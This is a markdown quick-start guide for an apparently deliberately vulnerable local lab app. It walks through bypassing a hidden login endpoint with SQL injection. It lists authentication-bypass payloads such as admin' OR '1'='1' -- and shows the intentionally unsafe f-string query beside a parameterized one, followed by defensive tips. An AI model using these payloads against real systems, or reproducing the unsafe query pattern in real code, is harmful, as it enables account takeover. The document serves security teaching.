# Quick Start - Login SQL Injection

## 🎯 The Vulnerability

Hidden endpoint: `/login-advanced`
**Vulnerability:** SQL injection in username field
**Impact:** Bypass authentication, login as ANY user without password!

---

## ⚡ Quick Exploit (30 seconds)

### Step 1: Go to Hidden Endpoint
```
http://localhost:5000/login-advanced
```

### Step 2: Enter Payload
```
Username: admin' OR '1'='1' --
Password: (anything, doesn't matter)
```

### Step 3: Click Login
```
✅ Logged in as ADMIN
✅ No password needed!
✅ Full system access!
```

---

## 🔧 Common Payloads

| Payload | Result |
|---|---|
| `admin' OR '1'='1' --` | Login as admin |
| `admin' --` | Login as admin |
| `' OR 1=1 --` | Login as first user |
| `user123' --` | Login as specific user |
| `' OR 'x'='x` | Login as first user |

---

## 📊 What Gets Logged

```bash
grep "LOGIN_SQLI_EXPLOIT" logs/security_alerts.log
```

Shows your attack:
```
Type: LOGIN_SQLI_EXPLOIT | User: admin | Payload: admin' OR '1'='1' --
```

---

## 🆚 Why This Works

### Regular Login (SAFE)
```python
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
# Parameterized query - injection blocked!
```

### Advanced Login (VULNERABLE)
```python
query = f"SELECT * FROM users WHERE username = '{username}' LIMIT 1"
cursor.execute(query)
# String concatenation - SQL injection works!
```

---

## 📝 Testing

1. **Reset:** `rm restaurant.db && python app.py`
2. **Create users:** Register some accounts
3. **Access:** `http://localhost:5000/login-advanced`
4. **Exploit:** Use payload `admin' OR '1'='1' --`
5. **Result:** Admin access without password!

---

## 💡 Key Insight

**This represents a real security risk:**
- Hidden debug endpoints left in code
- Developers forget they're there
- Uses old unsafe patterns
- Easy to find via directory enumeration
- Instant authentication bypass

**Always:**
- ✅ Use parameterized queries
- ✅ Remove debug code before deploy
- ✅ Validate ALL input
- ✅ Log authentication attempts
- ✅ Monitor for SQL patterns
